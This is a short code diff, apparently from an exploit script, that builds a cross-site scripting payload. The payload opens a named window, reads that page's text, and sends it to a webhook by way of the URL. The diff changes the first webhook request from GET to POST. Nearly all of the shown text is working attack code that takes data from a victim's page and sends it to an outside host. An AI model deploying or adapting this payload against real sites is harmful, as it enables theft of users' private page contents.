@@ -29,7 +29,7 @@ try {
 
   const payload = `
 let xhr = new XMLHttpRequest();
-xhr.open("GET", "${WEBHOOK}?imin", false);
+xhr.open("POST", "${WEBHOOK}?imin", false);
 xhr.send(null);
 const profile = window.open("", "${OPEN}");
 window.location = "${WEBHOOK}?" + profile.document.body.innerText;
